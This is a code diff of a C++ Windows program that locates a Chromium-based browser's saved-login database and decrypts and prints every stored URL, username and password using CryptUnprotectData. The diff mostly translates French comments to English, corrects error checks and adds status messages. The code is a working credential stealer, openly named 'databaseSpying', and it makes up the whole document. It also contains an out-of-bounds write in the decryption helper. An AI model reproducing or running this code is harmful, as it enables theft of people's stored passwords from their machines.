@@ -4,38 +4,46 @@
 bool isBrowserInstalled(const char *regKeyPath) 
 { 
 	HKEY hkey = NULL;
-	if (!RegOpenKeyExA(HKEY_LOCAL_MACHINE, regKeyPath, 0, KEY_READ, &hkey))
+
+	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, regKeyPath, 0, KEY_READ, &hkey) != ERROR_SUCCESS)
 	{ 
-		std::cerr << "[KO]\tBrowser is not installed" << std::endl; 
+		std::cerr << "[KO] Browser is not installed" << std::endl; 
 		return (false);
-        }
-	RegCloseKey(hkey); // on referme la clé après l'ouverture grâce au handle hkey         
+    	}
+	std::cout << "[OK] Browser is installed" << std::endl;
+	RegCloseKey(hkey); // close the key with handle pointer        
 	return (true);
 }
 
 bool findAppdataPath(std::string &appdataPath, int folder) 
 { 
-	char path[MAX_PATH] = { 0 }; // MAX_PATH == 260 characters, macro présente dans Windows.h 
-	if (!SUCCEEDED(SHGetFolderPathA(NULL, folder, NULL, 0, path))) 
+	char path[MAX_PATH] = { 0 }; // MAX_PATH == 260 characters
+
+	if (SHGetFolderPathA(NULL, folder, NULL, 0, path) != S_OK)
 	{ 
-		std::cerr << "[KO]\tError failed to find Appdata directory" << std::endl; 
+		std::cerr << "[KO] Error failed to find Appdata folder" << std::endl; 
 		return (false); 
-	}         
-	appdataPath.append(path); // on ajoute la path dans notre string 
+	}
+	std::cout << "[OK] Appdata folder found" << std::endl;
+	appdataPath.append(path); // add path in our string
 	return (true);
 }
 
 void findPasswordTable(sqlite3 *db) 
 { 
 	sqlite3_stmt *stmt;
-	if (sqlite3_prepare_v2(db, QUERY, -1, &stmt, NULL) == SQLITE_OK) 
-	{ 
+
+	std::cout << "[OK] Database open" << std::endl;
+	if (sqlite3_prepare_v2(db, QUERY, -1, &stmt, 0) == SQLITE_OK) 
+	{
+		std::cout << "[OK] Query successfully compiled" << std::endl;
 		while (sqlite3_step(stmt) == SQLITE_ROW)  
-			printPassword(stmt); /* On déchiffre et on affiche les mots de passes */  
+			printPassword(stmt); /* decrypt and display infos */  
 	} 
 	else 
-		std::cerr << "[KO]\tError compiling query" << std::endl; sqlite3_finalize(stmt); // on indique que l'on a plus besoin de la déclaration 
-	sqlite3_close(db); // on ferme la bdd 
+		std::cerr << "[KO] Error compiling query" << std::endl; 
+	sqlite3_finalize(stmt); // finalize the compiled query
+	sqlite3_close(db); // close database
 }
 
 const char *uncryptData(BYTE *password, int size) 
@@ -43,38 +51,40 @@ const char *uncryptData(BYTE *password, int size)
 	DATA_BLOB in; 
 	DATA_BLOB out;
 
-        in.pbData = password;
-        in.cbData = size + 1; 
+    	in.pbData = password;
+    	in.cbData = size + 1; 
 	if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out))  
 	{ 
-		out.pbData[out.cbData] = 0; // on set le '\0' 
+		out.pbData[out.cbData] = 0; // set zero terminator '\0' 
 		return ((const char*)out.pbData);
-        } 
+    	} 
 	return ("Error not found\n");
 }
 
 void printPassword(sqlite3_stmt *stmt) 
 { 
-	puts((const char*)sqlite3_column_text(stmt, 0)); // affiche l'url 
-	puts((const char*)sqlite3_column_text(stmt, 1)); // affiche le login 
-	// déchiffre et affiche le mot de passe 
-	puts(uncryptData((BYTE*)sqlite3_column_text(stmt, 3), sqlite3_column_int(stmt, 2))); 
+	// display URL
+	std::cout << std::endl << "URL:\t" << sqlite3_column_text(stmt, 0) << std::endl;
+	// display login
+	std::cout << "Login:\t" << sqlite3_column_text(stmt, 1) << std::endl;
+	// decrypt and display password
+	std::cout << "Password:\t" << uncryptData((BYTE*)sqlite3_column_text(stmt, 3), sqlite3_column_int(stmt, 2)) << std::endl << std::endl;
 }
 
 void databaseSpying(const char *dbFilePath, const char *regKeyPath, int folder) 
 { 
-        sqlite3 *db; 
-        std::string dbPath; 
+	sqlite3 *db; 
+	std::string dbPath; 
 
-        if (isBrowserInstalled(regKeyPath)) // y a t'il bien un navigateur Chrome Engine ?
-        {
-                if (findAppdataPath(dbPath, folder)) // quel est son dossier appdata ?
-                { 
-                        dbPath += dbFilePath; // path du dossier appadata + le path du fichier de la bdd
-                        if (sqlite3_open(dbPath.c_str(), &db) == SQLITE_OK) 
-                                findPasswordTable(db); /* Trouver les mots de passes et les déchiffrer */
-                        else 
-                                std::cerr << "[KO]\tError opening database" << std::endl; 
-                } 
-       } 
+	if (isBrowserInstalled(regKeyPath)) // is browser installed on this computer ?
+	{
+		if (findAppdataPath(dbPath, folder)) // where is it's appdata folder
+		{ 
+			dbPath += dbFilePath; // appdata folder path + database file path
+			if (sqlite3_open(dbPath.c_str(), &db) == SQLITE_OK)
+				findPasswordTable(db); /* find password table on database */
+			else 
+				std::cerr << "[KO] Error opening database" << std::endl; 
+		} 
+	} 
 }
